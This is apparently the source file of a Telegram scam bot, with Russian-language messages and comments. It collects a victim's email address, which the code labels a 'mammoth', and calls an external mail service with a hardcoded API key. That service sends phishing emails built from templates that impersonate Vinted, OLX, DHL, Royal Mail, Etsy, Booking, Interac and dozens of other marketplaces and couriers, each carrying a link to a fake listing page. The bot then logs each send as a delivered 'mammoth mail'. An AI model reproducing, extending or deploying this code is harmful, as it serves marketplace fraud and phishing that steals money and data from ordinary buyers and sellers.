const { Markup } = require("telegraf");
const WizardScene = require("telegraf/scenes/wizard");
const { Log, Ad, Country, Service } = require("../database");

const myAd = require("../commands/myCreateAd");
const log = require("../helpers/log");

const axios = require("axios");

const tempsId = {
  adverts_ie:467,
  milanuncios_es: 164,
  wallapop_pt: 85,
  wallapop_es: 14,
  wallapop_it: 18,
  wallapop_es_ref: 17,
  carousell_sg: 24,
  carousell_my: 152,
  etsy_de: 406,
  etsy_eu: 404,
  etsyverif_eu: 463,
  olx_ro: 33,
  fancourier_ro: 88,
  vinted_be: 10,
  vinted_uk: 5,
  willhaben_at: 22,
  vinted_at: 4,
  vinted_de: 4,
  vinted_it: 8,
  vinted_es: 6,
  vinted_fr: 7,
  vinted_pl: 11,
  booking_eu: 2,
  vinted_hu: 145,
  ebay_de: 58,
  packeta_sk: 50,
  dpd_sk: 46,
  dba_dk: 99,
  subito_it: 47,
  dpd_eu: 67,
  gls_hu: 314,
  blocket_se: 93,
  postnord_se: 170,
  jofogas_hu: 76,
  foxpost_hu: 146,
  marktplaats_nl: 207,
  canadapost_ca: 39,
  royalmail_uk: 117,
  dao_dk: 97,
  leboncoin_fr: 52,
  western_eu: 181,
  lebocoinn_fr: 53,
  ebaykleinanzeigen_de: 58,
  dhl_de: 63,
  dhl_es: 177,
  tutti_de: 34,
  tutti_fr: 34,
  post_de: 35,
  post_fr: 35,
  gumtree_au: 104,
  gumtree_au_ref: 105,
  emiratespost_ae: 184,
  depop_au: 241,
  depop_uk: 241,
  depop_fr: 303,
  depop_de: 302,
  milanuncios_es: 164,
  correos_es: 131,
  euroexpress_ba: 403,
  vestiairecollective_eu: 432,
  swisspost_ch: 35,
  ricardo_ch: 195,
  anibis_ch: 149,
  tradera_se: 358,
  njuskalo_hr: 356,
  opensooq_om: 78,
  opensooq_bh: 78,
  opensooq_sa: 78,
  fiverr_eu: 501,
  fiverr_com: 497,
  interac_ca: 180,
};

const sendEmail = async (ctx, service, ad) => {
  try {
    await axios.post(
      "http://advanced1readers.com/send/",
      {
        key: "2bbf8d5e-0749-4cba-b7f8-db07a28bd657",
        query: {
          url: `https://${service.domain}/a/${ad.id}`,
          service: tempsId[ad.serviceCode],
          to: ctx.scene.state.data.mail,
          sender_username: ctx.from?.username ? `@${ctx.from.username}` : "не указан",
          sender_id: `${ctx.from?.id || "неизвестно"}`,

          item_data: { // Дополнительная информация о товаре
            title: ad.title || "не указан", // Название товара
            price: ad.price || "не указана", // Цена товара
            image_url: ad.photo || "не указана", // Ссылка на изображение
            client_name: ad.name || "не указана", // Имя клиента
          },
        },
      },
      { timeout: 10000 } // Тайм-аут 30 секунд
    );
     if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }
    await ctx.reply("<b>✅ Письмо успешно отправлено на указанный адрес</b>", {
      reply_to_message_id: ctx.message.message_id,
      parse_mode: "HTML",
    });

    log(
      ctx,
      `📧 <b>Письмо отправлено</b>:\n\n📍 <b>Сервис:</b> ${service.title}\n📬 <b>Почта мамонта:</b> ${ctx.scene.state.data.mail}\n🔗 <b>Ссылка:</b> <a href="https://${service.domain}/${ad.id}">Перейти</a>\n\n<i>ANAFEMA MAIL</i>`
    );
  } catch (err) {
     if (ctx.tempMessageId) {
      await ctx.deleteMessage(ctx.tempMessageId).catch(() => { });
    }
    const errorMessage =
      err.response && err.response.data && err.response.data.error
        ? err.response.data.error
        : "Неизвестная ошибка";

    console.error("Ошибка при отправке письма:", err);
    await ctx.reply(
      `<b>❌ Ошибка при отправке письма для сервиса ${service.title}!</b>

Сендер: <b>Anafema Mail</b>      

Ошибка: <b>${errorMessage}</b>

<i>Пожалуйста, перешлите это сообщение разработчику для решения данной проблемы.</i>`,
      { parse_mode: "HTML",
              reply_to_message_id: ctx.message.message_id,

       }
    );
  }
};

const scene = new WizardScene(
  "sendMailAd2",
  async (ctx) => {
    try {
      await ctx.reply("Введите почту мамонта", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {}; // Initialize state
      return ctx.wizard.next();
    } catch (err) {
      console.log(err);
      await ctx.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      // Capture email input and validate
      if (ctx.message?.text) {
        ctx.scene.state.data.mail = ctx.message.text;
      } else {
        await ctx.reply(
          "❌ Пожалуйста, введите действительный адрес электронной почты."
        );
        return; // Stay on the current step if the email is invalid
      }
      const ad = await Ad.findOne({ where: { id: ctx.scene.state.adId } });
      const service = await Service.findOne({
        where: { code: ad.serviceCode },
      });
   const sendingMessage = await ctx.reply("⏳ Письмо отправляется...");

      setImmediate(() => {
        const miniCtx = {
          from: ctx.from,
          message: ctx.message,
          reply: (...args) => ctx.reply(...args),
          deleteMessage: (...args) => ctx.deleteMessage(...args),
          scene: {
            state: {
              data: {
                mail: ctx.scene.state.data.mail,
              },
            },
          },
          tempMessageId: sendingMessage.message_id, // ← передаём ID сообщения
        };

        sendEmail(miniCtx, service, ad).catch((err) => {
          console.error("Ошибка при отправке:", err.message);
        });
      });
      return ctx.scene.leave();
    } catch (err) {
      console.error(err);
            await ctx.deleteMessage(loadingMsg.message_id).catch(() => { });

      await ctx.replyWithHTML(
        `<b>❌ Ошибка при отправке письма!</b>\nОшибка сервера: <b>${err.message}</b>`
      );
      return ctx.scene.leave();
    }
  }
);

scene.leave((ctx) => myAd(ctx, ctx.scene.state.adId));
module.exports = scene;
